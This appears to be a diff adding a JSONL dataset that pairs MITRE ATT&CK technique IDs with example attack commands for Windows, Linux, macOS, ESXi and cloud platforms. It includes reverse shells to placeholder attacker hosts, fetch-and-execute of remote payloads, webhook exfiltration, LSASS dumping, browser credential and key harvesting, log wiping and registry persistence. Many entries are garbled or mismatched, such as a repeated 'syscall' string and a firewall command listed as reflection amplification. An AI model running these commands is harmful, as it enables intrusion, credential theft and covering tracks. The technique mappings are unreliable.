+{"mitre_id": "T1036.009", "name": "Break Process Trees", "platform": "Linux", "command": "exec /bin/sh -c \"fork; fork; exit\""}
+{"mitre_id": "T1590.004", "name": "Network Topology", "platform": "PRE", "command": "nmap -sV -A 192.168.1.0/24"}
+{"mitre_id": "T1587.002", "name": "Code Signing Certificates", "platform": "PRE", "command": "openssl req -x509 -newkey rsa:2048 -nodes -keyout selfsigned.key -out selfsigned.crt -days 365 -subj \"/C=US/ST=State/L=Locality/O=Organization/CN=example.com\""}
+{"mitre_id": "T1222.001", "name": "Windows File and Directory Permissions Modification", "platform": "Windows", "command": "icacls C:\\path\\to\\file.txt /grant:r \"Domain Users\":R"}
+{"mitre_id": "T1137.006", "name": "Add-ins", "platform": "Windows", "command": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Res registry key\" /v \"Add-ins\" /t REG_SZ /d \"C:\\Path\\To\\AddIn.dll\" /f"}
+{"mitre_id": "T1505.002", "name": "Transport Agent", "platform": "Linux", "command": "`sudo apt-get install msbuild`"}
+{"mitre_id": "T1082", "name": "System Information Discovery", "platform": "ESXi", "command": "esxcli system hostname get"}
+{"mitre_id": "T1071", "name": "Application Layer Protocol", "platform": "Linux", "command": "nc -e /bin/bash 192.168.1.100 443"}
+{"mitre_id": "T1574.014", "name": "AppDomainManager", "platform": "Windows", "command": "new AppDomain(\"malicious_assembly\", AppDomain.CurrentDomain.Evidence, new PermissionSet(PermissionSet.FullTrust), true, \"/lib/path/to/malicious_assembly.dll\")"}
+{"mitre_id": "T1074.002", "name": "Remote Data Staging", "platform": "Windows", "command": "`copy C:\\path\\to\\source\\file.txt C:\\path\\to\\staging\\location`"}
+{"mitre_id": "T1098.006", "name": "Additional Container Cluster Roles", "platform": "Containers", "command": "kubectl create clusterrolebinding additional-role-binding --clusterrole=additional-role --user=adversary-account"}
+{"mitre_id": "T1053", "name": "Scheduled Task/Job", "platform": "Windows", "command": "schtasks /create /tn \"MaliciousTask\" /tr \"C:\\path\\to\\malicious.exe\" /sc daily /st 08:00"}
+{"mitre_id": "T1218.007", "name": "Msiexec", "platform": "Windows", "command": "msiexec.exe /a C:\\path\\to\\malicious.msi /qn /lvm C:\\path\\to\\log.log"}
+{"mitre_id": "T1162", "name": "Login Item", "platform": "macOS", "command": "osascript -e 'tell application \"System Events\" to set loginitems of login items to {\"path_to_your_malicious_app\"}'"}
+{"mitre_id": "T1590.003", "name": "Network Trust Dependencies", "platform": "PRE", "command": "net trust show"}
+{"mitre_id": "T1498.002", "name": "Reflection Amplification", "platform": "Windows", "command": "netsh advfirewall set allprofiles state on"}
+{"mitre_id": "T1556.002", "name": "Password Filter DLL", "platform": "Windows", "command": "`reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LoginProviders\" /v \"FilterDll\" /t REG_SZ /d \"C:\\path\\to\\malicious_filter.dll\" /f`"}
+{"mitre_id": "T1505.005", "name": "Terminal Services DLL", "platform": "Windows", "command": "reg add \"HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\" /v ServiceDll /t REG_SZ /d \"C:\\path\\to\\malicious_termsrv.dll\""}
+{"mitre_id": "T1059.002", "name": "AppleScript", "platform": "macOS", "command": "osascript -e 'do shell script \"ls\" with administrator privileges'"}
+{"mitre_id": "T1176", "name": "Software Extensions", "platform": "Linux", "command": "`sudo apt install chromium-browser --install-recommends`"}
+{"mitre_id": "T1499.002", "name": "Service Exhaustion Flood", "platform": "Windows", "command": "`hping3 -S -c 10000 -w 128 -f ip.txt`"}
+{"mitre_id": "T1195.003", "name": "Compromise Hardware Supply Chain", "platform": "Linux", "command": "`sudo apt-get install -y firmware-modtool`"}
+{"mitre_id": "T1106", "name": "Native API", "platform": "Linux", "command": "syscall syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls syscalls sys"}
+{"mitre_id": "T1558.005", "name": "Ccache Files", "platform": "Linux", "command": "`find /tmp -name \"krb5cc_*\" -print`"}
+{"mitre_id": "T1070.007", "name": "Clear Network Connection History and Configurations", "platform": "Linux", "command": "rm -rf /var/log/* /Library/Logs/* /etc/sysctl.conf /etc/hosts /etc/hosts.*"}
+{"mitre_id": "T1558.004", "name": "AS-REP Roasting", "platform": "Windows", "command": "Get-WinEvent -FilterHashtable @{ProviderName='Microsoft-Windows-Kerberos-KeyDistributionCenter';Id=4} | Select-Object -ExpandProperty Message | Where-Object {$_ -match \"KDC has no support for encryption type\"}"}
+{"mitre_id": "T1058", "name": "Service Registry Permissions Weakness", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\service_name\" /v ImagePath /t REG_SZ /d \"C:\\path\\to\\adversary-controlled\\executable.exe\""}
+{"mitre_id": "T1584.003", "name": "Virtual Private Server", "platform": "PRE", "command": "aws ec2 run-instances --image-id ami-0c55b159cbff4159a --count 1 --instance-type t2.micro"}
+{"mitre_id": "T1059.010", "name": "AutoHotKey & AutoIT", "platform": "Windows", "command": "Run(\"C:\\path\\to\\malicious_script.ahk\")"}
+{"mitre_id": "T1600.001", "name": "Reduce Key Space", "platform": "Network Devices", "command": "crypto key generate size 128"}
+{"mitre_id": "T1070.003", "name": "Clear Command History", "platform": "ESXi", "command": "rm /var/log/shell.log"}
+{"mitre_id": "T1202", "name": "Indirect Command Execution", "platform": "Windows", "command": "forfiles /p C:\\path\\to\\directory /s /m *.* /c \"cmd /c echo @file\""}
+{"mitre_id": "T1024", "name": "Custom Cryptographic Protocol", "platform": "Linux", "command": "python3 -c 'import hashlib; print(hashlib.md5(\"command_to_encrypt\").hexdigest())'"}
+{"mitre_id": "T1536", "name": "Revert Cloud Instance", "platform": "IaaS", "command": "aws restore-snapshot --description \"Reverted instance\" --snapshot-id snap-123456abcdef --instance-id i-1234567890abcdef"}
+{"mitre_id": "T1091", "name": "Replication Through Removable Media", "platform": "Windows", "command": "wmic.exe process where \"imagepath\"=\"C:\\\\*autorun.inf\""}
+{"mitre_id": "T1005", "name": "Data from Local System", "platform": "ESXi", "command": "esxcli system settings get"}
+{"mitre_id": "T1140", "name": "Deobfuscate/Decode Files or Information", "platform": "ESXi", "command": "esxcli vm process kill --type=soft --vm=<vm-name>"}
+{"mitre_id": "T1137.005", "name": "Outlook Rules", "platform": "Windows", "command": "vbsedit.exe /nologo /new \"C:\\Path\\To\\Rule.vbs\""}
+{"mitre_id": "T1562", "name": "Impair Defenses", "platform": "Windows", "command": "net stop \"Windows Update\""}
+{"mitre_id": "T1586.003", "name": "Cloud Accounts", "platform": "PRE", "command": "aws iam get-user --user-name \"example_user\""}
+{"mitre_id": "T1586.002", "name": "Email Accounts", "platform": "PRE", "command": "`Get-Content -Path \"C:\\Users\\username\\AppData\\Local\\Microsoft\\Outlook\\RoamCache\\*.dat\"`"}
+{"mitre_id": "T1098.007", "name": "Additional Local or Domain Groups", "platform": "Windows", "command": "net localgroup administrators username /add"}
+{"mitre_id": "T1608.001", "name": "Upload Malware", "platform": "PRE", "command": "`powershell -Command \"Invoke-WebRequest -Uri https://example.com/malware.exe -OutFile C:\\malware.exe\"`"}
+{"mitre_id": "T1195", "name": "Supply Chain Compromise", "platform": "Linux", "command": "`sudo apt update && sudo apt upgrade`"}
+{"mitre_id": "T1190", "name": "Exploit Public-Facing Application", "platform": "Containers", "command": "docker run -it --rm -p 80:80 -v /path/to/vulnerable/containerized/webapp:/app k8s:vulnerable-webapp"}
+{"mitre_id": "T1558", "name": "Steal or Forge Kerberos Tickets", "platform": "Windows", "command": "klist tgt"}
+{"mitre_id": "T1555", "name": "Credentials from Password Stores", "platform": "IaaS", "command": "aws iam get-login-profiles"}
+{"mitre_id": "T1567", "name": "Exfiltration Over Web Service", "platform": "ESXi", "command": "curl -s https://example.com/exfiltrated_data"}
+{"mitre_id": "T1219", "name": "Remote Access Tools", "platform": "Linux", "command": "ssh user@target_system_ip"}
+{"mitre_id": "T1583.001", "name": "Domains", "platform": "PRE", "command": "aws route53 create-zone --domain-name example.com --hosted-zone-id Z12345678"}
+{"mitre_id": "T1560.002", "name": "Archive via Library", "platform": "Linux", "command": "rarfile.Archive('data.txt').write('archived_data.rar')"}
+{"mitre_id": "T1055.003", "name": "Thread Execution Hijacking", "platform": "Windows", "command": "`OpenThread(NULL, 0, hProcess, NULL, &hThread, NULL, 0x1f, NULL);`"}
+{"mitre_id": "T1079", "name": "Multilayer Encryption", "platform": "Linux", "command": "gpg --encrypt --recipient <recipient_email> --armor | openssl enc -aes-256-cbc -base64 | openssl smime -encrypt -binary -in - -out encrypted_file.enc"}
+{"mitre_id": "T1036", "name": "Masquerading", "platform": "Containers", "command": "`docker run -it --rm -v /:/host --name bash bash -c \"mv /bin/bash /bin/ls\"`"}
+{"mitre_id": "T1546.011", "name": "Application Shimming", "platform": "Windows", "command": "`wmic datafile where \"path='C:\\\\Windows\\\\AppPatch\\\\sysmain.sdb'\" get name`"}
+{"mitre_id": "T1552", "name": "Unsecured Credentials", "platform": "Windows", "command": "`reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"ProxyEnable\"`"}
+{"mitre_id": "T1547.010", "name": "Port Monitors", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\{MONITOR_NAME}\\Driver\" /v Driver /t REG_SZ /d \"C:\\Windows\\System32\\{DLL_NAME}.dll\""}
+{"mitre_id": "T1070.008", "name": "Clear Mailbox Data", "platform": "Linux", "command": "mail -r"}
+{"mitre_id": "T1037.002", "name": "Login Hook", "platform": "macOS", "command": "defaults write /Library/Preferences/com.apple.loginwindow LoginHook '/path/to/malicious/script.sh'"}
+{"mitre_id": "T1659", "name": "Content Injection", "platform": "Linux", "command": "`tcpdump -i any -s 0 -w captured_traffic.pcap -vv -n -c 1000 'tcp port 80 and not (src 192.168.1.1 and dst 192.168.1.1)'`"}
+{"mitre_id": "T1055", "name": "Process Injection", "platform": "Linux", "command": "python -c 'import os; os.system(\"bash -c \\\"bash -i >& /dev/tcp/your_ip/your_port 0>&1\\\"\"')"}
+{"mitre_id": "T1567.004", "name": "Exfiltration Over Webhook", "platform": "Windows", "command": "`curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"text\\\":\\\"Sensitive data\\\"}\" https://webhook.site/your-webhook-url`"}
+{"mitre_id": "T1139", "name": "Bash History", "platform": "Linux", "command": "cat ~/.bash_history"}
+{"mitre_id": "T1205", "name": "Traffic Signaling", "platform": "Linux", "command": "nc -vv -w 1 192.168.1.100 22"}
+{"mitre_id": "T1021.008", "name": "Direct Cloud VM Connections", "platform": "IaaS", "command": "aws ec2 get-console-output --instance-id i-0123456789abcdef0"}
+{"mitre_id": "T1503", "name": "Credentials from Web Browsers", "platform": "Linux", "command": "sqlite3 /home/user/.mozilla/firefox/*.default/places.sqlite \"SELECT moz_name, moz_password FROM logins\""}
+{"mitre_id": "T1218", "name": "System Binary Proxy Execution", "platform": "Windows", "command": "cmd /c \"powershell.exe -c \\\"powershell.exe -c \\\"powershell.exe -c 'Invoke-Expression -Command (Get-Content -Path 'C:\\path\\to\\malicious\\script.ps1')\\\"\\\"\\\"\\\""}
+{"mitre_id": "T1153", "name": "Source", "platform": "Linux", "command": ". /path/to/malicious_script.sh"}
+{"mitre_id": "T1038", "name": "DLL Search Order Hijacking", "platform": "Windows", "command": "`reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousDLL\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\"`"}
+{"mitre_id": "T1050", "name": "New Service", "platform": "Windows", "command": "sc create \"New Service\" binPath= \"C:\\path\\to\\malicious\\executable.exe\""}
+{"mitre_id": "T1070.006", "name": "Timestomp", "platform": "ESXi", "command": "touch -r <filename> <filename>"}
+{"mitre_id": "T1557.004", "name": "Evil Twin", "platform": "Network Devices", "command": "`nmap -sS -p 53,80,443 192.168.1.0/24`"}
+{"mitre_id": "T1620", "name": "Reflective Code Loading", "platform": "Linux", "command": "python -c 'import os; exec(os.popen(\"curl https://example.com/malicious_payload\").read())'"}
+{"mitre_id": "T1016.002", "name": "Wi-Fi Discovery", "platform": "Linux", "command": "ls /etc/NetworkManager/system-connections/"}
+{"mitre_id": "T1480.002", "name": "Mutual Exclusion", "platform": "Linux", "command": "ls /proc/acquire_mutex_name"}
+{"mitre_id": "T1564.011", "name": "Ignore Process Interrupts", "platform": "Linux", "command": "nohup command &>/dev/null &"}
+{"mitre_id": "T1611", "name": "Escape to Host", "platform": "Windows", "command": "docker run -it --rm -v //c://c/ --privileged msysgit/bash -c \"powershell -c 'Get-WmiObject -Class Win32_Process -Filter 'Name = \"powershell.exe\" | ForEach-Object { $_.Terminate()}'\""}
+{"mitre_id": "T1518.002", "name": "Backup Software Discovery", "platform": "Windows", "command": "netsh advfirewall show config"}
+{"mitre_id": "T1547.009", "name": "Shortcut Modification", "platform": "Windows", "command": "mklink \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malicious.lnk\" \"C:\\path\\to\\malware.exe\""}
+{"mitre_id": "T1010", "name": "Application Window Discovery", "platform": "Linux", "command": "wmctrl -m"}
+{"mitre_id": "T1569.003", "name": "Systemctl", "platform": "Linux", "command": "systemctl start malicious_service"}
+{"mitre_id": "T1032", "name": "Standard Cryptographic Protocol", "platform": "Linux", "command": "openssl enc -aes-256-cbc -in input.txt -out output.txt -k 12345678"}
+{"mitre_id": "T1087.003", "name": "Email Account", "platform": "Windows", "command": "Get-GlobalAddressList"}
+{"mitre_id": "T1062", "name": "Hypervisor", "platform": "Windows", "command": "`bcdedit /set hypervisorlaunchtype auto`"}
+{"mitre_id": "T1497.003", "name": "Time Based Checks", "platform": "Linux", "command": "`gettimeofday()`"}
+{"mitre_id": "T1182", "name": "AppCert DLLs", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" /v AppCertDLLs /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"mitre_id": "T1218.003", "name": "CMSTP", "platform": "Windows", "command": "cmstp.exe /install /inf=\"path\\to\\malicious.inf\""}
+{"mitre_id": "T1563.001", "name": "SSH Hijacking", "platform": "Linux", "command": "ssh -x -L 8080:localhost:8080 user@target_host"}
+{"mitre_id": "T1562.002", "name": "Disable Windows Event Logging", "platform": "Windows", "command": "sc config eventlog start=disabled"}
+{"mitre_id": "T1029", "name": "Scheduled Transfer", "platform": "Linux", "command": "crontab -e"}
+{"mitre_id": "T1021.002", "name": "SMB/Windows Admin Shares", "platform": "Windows", "command": "net use \\\\localhost\\C$ /user:administrator"}
+{"mitre_id": "T1525", "name": "Implant Internal Image", "platform": "IaaS", "command": "aws ec2 create-image --name \"backdoored-image\" --description \"backdoored-image\" --no-reboot --instance-id i-1234567890abcdef0"}
+{"mitre_id": "T1572", "name": "Protocol Tunneling", "platform": "ESXi", "command": "ssh -L 8080:localhost:80 user@attacker-system"}
+{"mitre_id": "T1218.002", "name": "Control Panel", "platform": "Windows", "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls\" /v \"MaliciousApplet\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1599.001", "name": "Network Address Translation Traversal", "platform": "Network Devices", "command": "`show ip nat translation`"}
+{"mitre_id": "T1608.002", "name": "Upload Tool", "platform": "PRE", "command": "curl -O https://example.com/tool.exe"}
+{"mitre_id": "T1547.005", "name": "Security Support Provider", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\" /v \"MySSP\" /t REG_SZ /d \"C:\\path\\to\\myssp.dll\" /f"}
+{"mitre_id": "T1036.011", "name": "Overwrite Process Arguments", "platform": "Linux", "command": "echo -n \"spoofed_command\" > /proc/<PID>/cmdline"}
+{"mitre_id": "T1004", "name": "Winlogon Helper DLL", "platform": "Windows", "command": "reg add \"HKLM\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Notify /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1009", "name": "Binary Padding", "platform": "Linux", "command": "`dd if=/dev/zero bs=1024 count=1 >> malicious_binary.bin`"}
+{"mitre_id": "T1550", "name": "Use Alternate Authentication Material", "platform": "Windows", "command": "wmic.exe process where \"imagepath\"=\"C:\\\\Windows\\\\System32\\\\lsass.exe\""}
+{"mitre_id": "T1076", "name": "Remote Desktop Protocol", "platform": "Windows", "command": "c:\\windows\\system32\\tscon.exe 1"}
+{"mitre_id": "T1597.001", "name": "Threat Intel Vendors", "platform": "PRE", "command": "python requests.get('https://api.threatgrid.com/api/v2/search?q=')"}
+{"mitre_id": "T1011", "name": "Exfiltration Over Other Network Medium", "platform": "Linux", "command": "`nc -lvp 8080 -e /bin/bash`"}
+{"mitre_id": "T1602.002", "name": "Network Device Configuration Dump", "platform": "Network Devices", "command": "`show run`"}
+{"mitre_id": "T1589", "name": "Gather Victim Identity Information", "platform": "PRE", "command": "python social_media_enum.py"}
+{"mitre_id": "T1131", "name": "Authentication Package", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1181", "name": "Extra Window Memory Injection", "platform": "Windows", "command": "`SetWindowLong(hwnd, GWL_USERDATA, (LPARAM) 0x12345678);`"}
+{"mitre_id": "T1562.004", "name": "Disable or Modify System Firewall", "platform": "ESXi", "command": "esxcli network firewall set --enabled=false"}
+{"mitre_id": "T1560", "name": "Archive Collected Data", "platform": "Linux", "command": "tar -czvf archive.tar.gz /path/to/data"}
+{"mitre_id": "T1152", "name": "Launchctl", "platform": "macOS", "command": "launchctl submit -l my_agent - /bin/bash -c \"echo 'Hello, World!'\""}
+{"mitre_id": "T1553.003", "name": "SIP and Trust Provider Hijacking", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}\" /v Dll /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1483", "name": "Domain Generation Algorithms", "platform": "Linux", "command": "`dig +short nslookup -type=a istgmxdejdnxuyla.ru`"}
+{"mitre_id": "T1185", "name": "Browser Session Hijacking", "platform": "Windows", "command": "`powershell -ExecutionPolicy Bypass -Command \"Add-Type -AssemblyName PresentationCore; $ie = New-Object -ComObject Shell.Application; $ie.Navigate('https://example.com')\"`"}
+{"mitre_id": "T1021", "name": "Remote Services", "platform": "Linux", "command": "ssh user@target_host"}
+{"mitre_id": "T1071.003", "name": "Mail Protocols", "platform": "Linux", "command": "echo \"MAIL FROM:<victim@domain.com> RCPT TO:<attacker@domain.com> DATA\\r\\nSubject: Test\\r\\n\\r\\nX-Header: Command to execute\\r\\n\\r\\n.\\r\\nQUIT\" | sendmail -i -f attacker@domain.com"}
+{"mitre_id": "T1556.007", "name": "Hybrid Identity", "platform": "Windows", "command": "net stop AzureADConnectAuthenticationAgentService"}
+{"mitre_id": "T1595.002", "name": "Vulnerability Scanning", "platform": "PRE", "command": "nmap -sV -A 192.168.1.100"}
+{"mitre_id": "T1059.009", "name": "Cloud API", "platform": "IaaS", "command": "az vm create --resource-group MyResourceGroup --name MyVm --image UbuntuServer --admin-username azureuser --admin-password P@ssw0rd123 --size Standard_DS2_v2"}
+{"mitre_id": "T1596", "name": "Search Open Technical Databases", "platform": "PRE", "command": "whois example.com"}
+{"mitre_id": "T1218.015", "name": "Electron Applications", "platform": "Linux", "command": "electron --enable-features=CrashReporter --no-sandbox --execute-shell-command=\"bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'\""}
+{"mitre_id": "T1562.012", "name": "Disable or Modify Linux Audit System", "platform": "Linux", "command": "systemctl stop auditd"}
+{"mitre_id": "T1207", "name": "Rogue Domain Controller", "platform": "Windows", "command": "netdom add dc <RogueDCName> /realm <DomainName> /newsysvol /add"}
+{"mitre_id": "T1553.006", "name": "Code Signing Policy Modification", "platform": "Windows", "command": "bcdedit.exe -set TESTSIGNING ON"}
+{"mitre_id": "T1610", "name": "Deploy Container", "platform": "Containers", "command": "docker run -it --rm -v /:/host --privileged my_malicious_image"}
+{"mitre_id": "T1107", "name": "File Deletion", "platform": "Linux", "command": "rm -rf /path/to/file"}
+{"mitre_id": "T1145", "name": "Private Keys", "platform": "Linux", "command": "find / -name \"*.key\" -o -name \"*.pgp\" -o -name \"*.gpg\" -o -name \"*.ppk\" -o -name \"*.p12\" -o -name \"*.pem\" -o -name \"*.pfx\" -o -name \"*.cer\" -o -name \"*.p7b\" -o -name \"*.asc\""}
+{"mitre_id": "T1112", "name": "Modify Registry", "platform": "Windows", "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousProgram\" /t REG_SZ /d \"C:\\path\\to\\malicious\\program.exe\""}
+{"mitre_id": "T1543.004", "name": "Launch Daemon", "platform": "macOS", "command": "<code>sudo plutil -convert xml1 -r -o /Library/LaunchDaemons/com.example.malicious.plist /Library/LaunchDaemons/com.example.malicious.plist</code>"}
+{"mitre_id": "T1580", "name": "Cloud Infrastructure Discovery", "platform": "IaaS", "command": "gcloud compute instances list"}
+{"mitre_id": "T1555.003", "name": "Credentials from Web Browsers", "platform": "Linux", "command": "sqlite3 /home/user/.mozilla/firefox/*.default/places.sqlite \"SELECT moz_name, moz_password FROM moz_logins\""}
+{"mitre_id": "T1574.008", "name": "Path Interception by Search Order Hijacking", "platform": "Windows", "command": "cmd.exe /C net user"}
+{"mitre_id": "T1491", "name": "Defacement", "platform": "Windows", "command": "`net stop w3svc`"}
+{"mitre_id": "T1535", "name": "Unused/Unsupported Cloud Regions", "platform": "IaaS", "command": "aws ec2 describe-regions"}
+{"mitre_id": "T1557.003", "name": "DHCP Spoofing", "platform": "Linux", "command": "`dhcpcd -T 192.168.1.100 -s 192.168.1.200`"}
+{"mitre_id": "T1155", "name": "AppleScript", "platform": "macOS", "command": "osascript -e 'tell application \"Terminal\" to do script \"whoami\"'"}
+{"mitre_id": "T1563", "name": "Remote Service Session Hijacking", "platform": "Linux", "command": "ssh -L 8080:localhost:3389 user@target_linux_system"}
+{"mitre_id": "T1564.013", "name": "Bind Mounts", "platform": "Linux", "command": "mount --bind /proc/benign-process /proc/malicious-process"}
+{"mitre_id": "T1027.001", "name": "Binary Padding", "platform": "Linux", "command": "`dd if=/dev/zero bs=1024 count=1 >> malicious_binary.bin`"}
+{"mitre_id": "T1505.003", "name": "Web Shell", "platform": "Linux", "command": "python -c 'import os; os.system(\"bash -i >& /dev/tcp/attacker_ip/8080 0>&1\")'"}
+{"mitre_id": "T1484.001", "name": "Group Policy Modification", "platform": "Windows", "command": "secpol.msc"}
+{"mitre_id": "T1217", "name": "Browser Information Discovery", "platform": "Linux", "command": "`find /home/* -type f -name \"*.chrome\" -o -name \"*.firefox\" -o -name \"*.opera\"`"}
+{"mitre_id": "T1552.004", "name": "Private Keys", "platform": "Linux", "command": "ls ~/.ssh/*"}
+{"mitre_id": "T1583.004", "name": "Server", "platform": "PRE", "command": "python setup_server.py"}
+{"mitre_id": "T1021.006", "name": "Windows Remote Management", "platform": "Windows", "command": "winrm -r -r:https://example.com -username:username -password:password -authenticodesktop -config:https://example.com/winrm.svc/config -enablesignedremotemanager -forceplaintext"}
+{"mitre_id": "T1011.001", "name": "Exfiltration Over Bluetooth", "platform": "Linux", "command": "`bluetoothctl info`"}
+{"mitre_id": "T1078.001", "name": "Default Accounts", "platform": "Windows", "command": "net user guest /active:no"}
+{"mitre_id": "T1547.003", "name": "Time Providers", "platform": "Windows", "command": "sc config w32time start= auto"}
+{"mitre_id": "T1183", "name": "Image File Execution Options Injection", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /t REG_SZ /d \"C:\\dbg\\ntsd.exe -g notepad.exe\""}
+{"mitre_id": "T1085", "name": "Rundll32", "platform": "Windows", "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://example.com/malicious.sct\")"}
+{"mitre_id": "T1031", "name": "Modify Existing Service", "platform": "Windows", "command": "sc config ServiceName binPath= \"C:\\path\\to\\malicious\\executable.exe\""}
+{"mitre_id": "T1546.005", "name": "Trap", "platform": "macOS", "command": "trap 'echo \"Interrupt received\"; exit' HUP INT QUIT PIPE TERM"}
+{"mitre_id": "T1574.006", "name": "Dynamic Linker Hijacking", "platform": "Linux", "command": "export LD_PRELOAD=/path/to/malicious_library.so"}
+{"mitre_id": "T1136.001", "name": "Local Account", "platform": "Linux", "command": "useradd -m newaccount"}
+{"mitre_id": "T1681", "name": "Search Threat Vendor Data", "platform": "PRE", "command": "shodan search \"example threat actor domain\""}
+{"mitre_id": "T1674", "name": "Input Injection", "platform": "Windows", "command": "powershell -ExecutionPolicy Bypass -Command \"Invoke-Expression -Command (Get-Content -Path C:\\path\\to\\malicious\\script.ps1)\""}
+{"mitre_id": "T1092", "name": "Communication Through Removable Media", "platform": "Linux", "command": "`cp /path/to/command /path/to/usb/directory`"}
+{"mitre_id": "T1070.001", "name": "Clear Windows Event Logs", "platform": "Windows", "command": "wevtutil cl system"}
+{"mitre_id": "T1585.002", "name": "Email Accounts", "platform": "PRE", "command": "net user /add \"adversary_email\" /domain"}
+{"mitre_id": "T1557.001", "name": "LLMNR/NBT-NS Poisoning and SMB Relay", "platform": "Windows", "command": "responder -I eth0 -lvv -d 192.168.1.0/24"}
+{"mitre_id": "T1222", "name": "File and Directory Permissions Modification", "platform": "ESXi", "command": "`esxcli storage filesystem permission set -p /path/to/directory -a read,write,execute`"}
+{"mitre_id": "T1003.001", "name": "LSASS Memory", "platform": "Windows", "command": "procdump -ma lsass.exe lsass_dump"}
+{"mitre_id": "T1053.001", "name": "At (Linux)", "platform": "Linux", "command": "at -f /path/to/malicious/script.sh"}
+{"mitre_id": "T1176.002", "name": "IDE Extensions", "platform": "Linux", "command": "code --install-extension vscode-remote-ssh"}
+{"mitre_id": "T1179", "name": "Hooking", "platform": "Windows", "command": "`windbg -c \"ba rwx 0x12345678 L1\" -k`"}
+{"mitre_id": "T1595", "name": "Active Scanning", "platform": "PRE", "command": "nmap -sS 192.168.1.0/24"}
+{"mitre_id": "T1027.016", "name": "Junk Code Insertion", "platform": "Linux", "command": "echo -n \"\" > /dev/null; echo -e \"\\x90\\x90\\x90\\x90\" >> /dev/null"}
+{"mitre_id": "T1547.011", "name": "Plist Modification", "platform": "macOS", "command": "defaults write /Library/Preferences/com.apple.loginitems.plist DYLD_INSERT_LIBRARIES /path/to/malicious.dylib"}
+{"mitre_id": "T1548", "name": "Abuse Elevation Control Mechanism", "platform": "Linux", "command": "sudo -s"}
+{"mitre_id": "T1134.002", "name": "Create Process with Token", "platform": "Windows", "command": "`psexec -s -i -h cmd.exe`"}
+{"mitre_id": "T1548.001", "name": "Setuid and Setgid", "platform": "Linux", "command": "chmod u+s /path/to/malicious_binary"}
+{"mitre_id": "T1547.004", "name": "Winlogon Helper DLL", "platform": "Windows", "command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Notify /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1019", "name": "System Firmware", "platform": "Windows", "command": "bcdedit /set {bootmgr} timeout 0"}
+{"mitre_id": "T1021.003", "name": "Distributed Component Object Model", "platform": "Windows", "command": "reg add \"HKLM\\Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\" /ve /t REG_SZ /d \"DCOM\" /f"}
+{"mitre_id": "T1042", "name": "Change Default File Association", "platform": "Windows", "command": "reg add \"HKEY_CLASSES_ROOT\\.txt\\shell\\open\\command\" /ve /d \"C:\\path\\to\\malicious\\program.exe\" /f"}
+{"mitre_id": "T1117", "name": "Regsvr32", "platform": "Windows", "command": "regsvr32 /s /u \"%~dp0malicious.dll\""}
+{"mitre_id": "T1110.003", "name": "Password Spraying", "platform": "Containers", "command": "nmap -p 22,21,139,445,88,3389,80,443,1433,1521,3306,5900 -script http-password-spray.nse -script-args 'passwords=\"password01, password02, password03\"'"}
+{"mitre_id": "T1090.002", "name": "External Proxy", "platform": "ESXi", "command": "`esxcli network ip route add -p 10.0.0.1/24 -g 10.0.0.1`"}
+{"mitre_id": "T1056.003", "name": "Web Portal Capture", "platform": "Linux", "command": "`tcpdump -i any -A -s 0 -w capture.pcap -v host <target_ip> and port 443`"}
+{"mitre_id": "T1589.002", "name": "Email Addresses", "platform": "PRE", "command": "python -c 'import requests; r = requests.get(\"https://autodiscover.office.com/autodiscover/autodiscover.json\"); print(r.json())'"}
+{"mitre_id": "T1164", "name": "Re-opened Applications", "platform": "macOS", "command": "defaults write com.apple.loginwindow LoginWindowRestartPrograms -array-add \"/path/to/malicious/executable\""}
